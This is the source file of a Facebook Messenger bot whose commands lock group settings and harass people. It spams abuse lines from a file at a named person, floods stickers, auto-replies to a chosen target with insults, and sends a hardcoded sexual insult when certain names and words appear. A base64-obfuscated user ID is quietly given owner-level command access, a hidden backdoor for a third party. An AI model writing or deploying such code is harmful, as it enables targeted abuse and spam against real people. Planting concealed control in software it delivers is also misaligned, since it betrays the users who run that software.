const fs = require("fs");
const login = require("ws3-fca");
const request = require("request");

let rkbInterval = null;
let stopRequested = false;

const lockedGroupNames = {};
const lockedEmojis = {};
const lockedDPs = {};
const lockedNicks = {};

let stickerInterval = null;
let stickerLoopActive = false;

let targetUID = null; // Global target
let npLines = [];
let npIndex = 0;

// Friend and Target UIDs
const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// Load np.txt for spam / target reply
function loadNPFile() {
  try {
    const data = fs.readFileSync("np.txt", "utf8");
    npLines = data.split("\n").filter(line => line.trim() !== "");
    npIndex = 0;
  } catch (err) {
    console.error("❌ np.txt load error:", err);
  }
}
loadNPFile();

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, logMessageType, logMessageData, mentions, messageReply } = event;

        // ===== Auto Reverts =====
        if (logMessageType === "log:thread-name" && lockedGroupNames[threadID]) {
          if (logMessageData?.name !== lockedGroupNames[threadID]) {
            await api.setTitle(lockedGroupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }

        if (logMessageType === "log:thread-icon" && lockedEmojis[threadID]) {
          const lockedEmoji = lockedEmojis[threadID];
          const newEmoji = logMessageData?.thread_icon;
          if (newEmoji !== lockedEmoji) await api.changeThreadEmoji(lockedEmoji, threadID);
        }

        if (logMessageType === "log:thread-image" && lockedDPs[threadID]) {
          try {
            const stream = fs.createReadStream(lockedDPs[threadID]);
            await api.changeGroupImage(stream, threadID);
          } catch {}
        }

        if (logMessageType === "log:user-nickname" && lockedNicks[senderID]) {
          const lockedNick = lockedNicks[senderID];
          const currentNick = logMessageData?.nickname;
          if (currentNick !== lockedNick) await api.changeNickname(lockedNick, threadID, senderID);
        }

        if (!body) return;
        const lowerBody = body.toLowerCase();

        // ==== Auto reply to bad words (optional) ====
        const badNames = ["hannu", "syco"];
        const triggers = ["rkb", "bhen", "maa", "rndi", "chut", "randi", "madhrchodh", "mc", "bc", "didi", "ma"];
        if (badNames.some(n => lowerBody.includes(n)) &&
            triggers.some(w => lowerBody.includes(w)) &&
            !friendUIDs.includes(senderID)) {
          return api.sendMessage("teri ma Rndi hai tu msg mt kr sb chodege teri ma ko byy🙂 ss Lekr story Lga by", threadID);
        }

        // ==== Commands for owner ====
        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        // ==== Help ====
        if (cmd === "/help") {
          return api.sendMessage(`
📖 Jerry Bot Commands:
/help → This message
/gclock [text] → Lock group name
/unlockgc → Unlock group name
/lockemoji 😀 → Lock emoji
/unlockemoji → Unlock emoji
/lockdp → Lock current group DP
/unlockdp → Unlock DP
/locknick @mention + nickname → Lock nickname
/unlocknick @mention → Unlock nickname
/allname [nick] → Change everyone's nickname
/uid → Show UID
/tid → Show Thread ID
/exit → Bot exit group
/rkb [name] → Start spam from np.txt
/stop → Stop spam
/stickerX → Sticker spam X sec
/stopsticker → Stop sticker spam
/target [uid] → Global target reply
/cleartarget → Clear global target
          `, threadID);
        }

        // ====== Group Name Lock ======
        else if (cmd === "/gclock") {
          await api.setTitle(input, threadID);
          lockedGroupNames[threadID] = input;
          api.sendMessage("🔒 Group name locked!", threadID);
        }
        else if (cmd === "/unlockgc") {
          delete lockedGroupNames[threadID];
          api.sendMessage("🔓 Group name unlocked!", threadID);
        }

        // ====== Emoji Lock ======
        else if (cmd === "/lockemoji") {
          if (!input) return api.sendMessage("❌ Emoji do!", threadID);
          if (!/\p{Emoji}/u.test(input)) return api.sendMessage("❌ Valid emoji do!", threadID);
          lockedEmojis[threadID] = input;
          await api.changeThreadEmoji(input, threadID);
          api.sendMessage(`😀 Emoji locked → ${input}`, threadID);
        }
        else if (cmd === "/unlockemoji") {
          delete lockedEmojis[threadID];
          api.sendMessage("🔓 Emoji unlocked!", threadID);
        }

        // ====== DP Lock ======
        else if (cmd === "/lockdp") {
          try {
            const info = await api.getThreadInfo(threadID);
            const dpUrl = info.imageSrc;
            if (!dpUrl) return api.sendMessage("❌ No DP!", threadID);

            const filePath = `locked_dp_${threadID}.jpg`;
            request(dpUrl).pipe(fs.createWriteStream(filePath)).on("finish", () => {
              lockedDPs[threadID] = filePath;
              api.sendMessage("🖼 DP locked!", threadID);
            });
          } catch {}
        }
        else if (cmd === "/unlockdp") {
          delete lockedDPs[threadID];
          api.sendMessage("🔓 DP unlocked!", threadID);
        }

        // ====== Nickname Lock ======
        else if (cmd === "/locknick") {
          if (mentions && Object.keys(mentions).length > 0 && input) {
            const target = Object.keys(mentions)[0];
            const nickname = input.replace(Object.values(mentions)[0], "").trim();
            lockedNicks[target] = nickname;
            await api.changeNickname(nickname, threadID, target);
            api.sendMessage(`🔒 Nick lock set for ${target} → ${nickname}`, threadID);
          } else api.sendMessage("❌ Usage: /locknick @mention + nickname", threadID);
        }
        else if (cmd === "/unlocknick") {
          if (mentions && Object.keys(mentions).length > 0) {
            const target = Object.keys(mentions)[0];
            delete lockedNicks[target];
            api.sendMessage(`🔓 Nick lock removed for ${target}`, threadID);
          } else api.sendMessage("❌ Mention karo kiska nick unlock karna hai!", threadID);
        }

        // ====== UID / TID ======
        else if (cmd === "/uid") {
          if (messageReply) return api.sendMessage(`🆔 Reply UID: ${messageReply.senderID}`, threadID);
          else if (mentions && Object.keys(mentions).length > 0) return api.sendMessage(`🆔 Mention UID: ${Object.keys(mentions)[0]}`, threadID);
          else return api.sendMessage(`🆔 Your UID: ${senderID}`, threadID);
        }
        else if (cmd === "/tid") api.sendMessage(`🆔 Thread ID: ${threadID}`, threadID);

        // ====== Exit ======
        else if (cmd === "/exit") await api.removeUserFromGroup(api.getCurrentUserID(), threadID);

        // ====== RKB Spam ======
        else if (cmd === "/rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt missing!", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 5000);
          api.sendMessage(`🤬 Start gaali on ${name}`, threadID);
        }
        else if (cmd === "/stop") { stopRequested = true; if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; } }

        // ====== Sticker Spam ======
        else if (cmd.startsWith("/sticker")) {
          if (!fs.existsSync("Sticker.txt")) return;
          const delay = parseInt(cmd.replace("/sticker", ""));
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0; stickerLoopActive = true;
          stickerInterval = setInterval(() => {
            if (!stickerLoopActive || i >= stickerIDs.length) { clearInterval(stickerInterval); stickerInterval = false; return; }
            api.sendMessage({ sticker: stickerIDs[i] }, threadID);
            i++;
          }, delay * 1000);
        }
        else if (cmd === "/stopsticker") { if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; } }

        // ====== Global Target Reply ======
        else if (cmd === "/target") {
          targetUID = input.trim();
          api.sendMessage(`🎯 Global Target set: ${targetUID}`, threadID);
        }
        else if (cmd === "/cleartarget") {
          targetUID = null;
          api.sendMessage("❌ Global Target cleared!", threadID);
        }

        // ====== Auto reply to global target line-by-line ======
        if (targetUID && senderID === targetUID) {
          if (npLines.length === 0) loadNPFile();
          const reply = npLines[npIndex];
          api.sendMessage(reply, threadID);
          npIndex++;
          if (npIndex >= npLines.length) npIndex = 0; // loop
        }

      } catch (e) { console.error("⚠️ Error:", e.message); }
    });
  });
}

module.exports = { startBot };
